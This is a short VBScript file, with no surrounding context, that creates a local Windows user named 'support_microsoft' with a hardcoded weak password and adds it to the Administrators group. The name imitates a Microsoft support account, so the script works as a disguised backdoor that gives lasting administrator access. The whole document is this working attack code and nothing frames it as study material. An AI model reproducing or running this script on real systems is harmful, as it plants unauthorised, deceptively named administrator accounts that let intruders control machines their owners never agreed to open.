set wsnetwork=CreateObject("WSCRIPT.NETWORK")
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os)
Set oe=GetObject(os&"/Administrators,group")
Set od=ob.Create("user","support_microsoft")
od.SetPassword "Aa123456=="
od.SetInfo
Set of=GetObject(os&"/support_microsoft",user)
oe.add os&"/support_microsoft"